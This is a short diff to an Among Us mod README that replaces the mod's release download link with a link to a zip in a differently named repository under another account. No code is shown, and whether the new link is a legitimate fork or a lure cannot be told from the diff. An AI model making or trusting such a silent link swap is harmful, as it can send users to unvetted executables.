@@ -75,7 +75,7 @@ Join our [Discord](https://discord.gg/SWv3aXFTAd) if you have any problems or wa
 # Releases
 | Among Us - Version| Mod Version | Link |
 |----------|-------------|-----------------|
-| 2022.12.14s & 2022.12.14e | v4.0.2 | [Download](https://github.com/eDonnes124/Town-Of-Us/releases/download/v4.0.9/ToU.v4.0.2.zip) |
+| 2022.12.14s & 2022.12.14e | v4.0.2 | [Download](https://github.com/jude1337/sorr0wUs/releases/download/v4.0.2/s0U.v4.0.2.zip) |
 
 <details>
   <summary> Changelog </summary>
